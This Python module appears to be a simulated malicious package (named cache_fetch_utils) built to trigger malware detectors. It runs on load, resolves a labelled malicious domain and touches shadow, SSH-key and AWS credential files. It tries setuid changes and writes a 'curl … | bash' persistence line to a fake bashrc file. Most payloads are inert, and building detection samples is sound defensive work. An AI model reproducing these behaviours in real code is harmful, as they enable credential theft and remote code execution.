# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( ctypes
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable
# cmdclass post_install "preinstall" "postinstall"
# import socket import subprocess import ctypes import pty

import os, socket, subprocess, base64, ctypes, mmap, time

__version__ = "1.0.0"
MALICIOUS_DOMAIN = "src-get.xam1riel.surf"
PORTS = [6667, 9001]

def try_open(p):
    try: open(p).close()
    except: pass

def connect_attempt(host, port):
    try:
        s = socket.socket(); s.settimeout(0.8)
        s.connect((host, port))
        s.send(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        s.close()
    except: pass

def run_payload():
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass

    try:
        subprocess.run([
            "curl", "-sS", "-m", "3", "-X", "GET",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: cache_fetch_utils/1.0",

            "http://127.0.0.1:8080/api/config"
        ], capture_output=True, timeout=6)
    except: pass

    for p in ['/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/hostname', '/etc/resolv.conf', '/etc/os-release', '/etc/group', '/etc/ssh/sshd_config']:
        try_open(p)
    for p in ['/root/.ssh/id_rsa', '/root/.ssh/authorized_keys', '/root/.aws/credentials', '/root/.bash_history']:
        try_open(p)

    for i in range(80):
        p = f"/tmp/cache_fetch_utils_artifact_{i}.txt"
        try:
            with open(p,"w") as f: f.write(f"artifact {i}\n")
            with open(p) as f: f.read()
            os.rename(p, p+".renamed")
            os.unlink(p+".renamed")
        except: pass

    try: os.system("chmod 777 /tmp/cache_fetch_utils_target 2>/dev/null || true")
    except: pass
    try: subprocess.run(["chmod","u+s","/tmp/cache_fetch_utils_target"], capture_output=True)
    except: pass
    try: subprocess.run(["chown","root:root","/tmp/cache_fetch_utils_target"], capture_output=True)
    except: pass

    try: exec(base64.b64decode(b"cHJpbnQoJ2RlY29kZWQtcGF5bG9hZCcp").decode())
    except: pass
    try:
        ctypes.CDLL("libc.so.6").ptrace(0,0,None,None)
        m = mmap.mmap(-1,4096,prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)
        m.write(b"\x90\x90\x90\x90")
    except: pass

    try: os.system("crontab -l >/tmp/cron_cache_fetch_utils 2>&1 || true")
    except: pass
    try: open("/tmp/.bashrc_cache_fetch_utils","a").write(f"curl -s src-get.xam1riel.surf/init | bash\n")
    except: pass

    try:
        subprocess.run(["/bin/sh","-c","exec 3>/usr/bin/cache_fetch_utils_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],
            timeout=8, capture_output=True)
    except: pass

    procs = []
    for i in range(15):
        try: procs.append(subprocess.Popen(["/bin/sh","-c","echo process-op; id; sleep 20"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        except: pass
    for port in PORTS:
        connect_attempt("127.0.0.1", port)
        connect_attempt("1.1.1.1", port)

    time.sleep(60)

    for p in procs:
        try: p.kill()
        except: pass

run_payload()
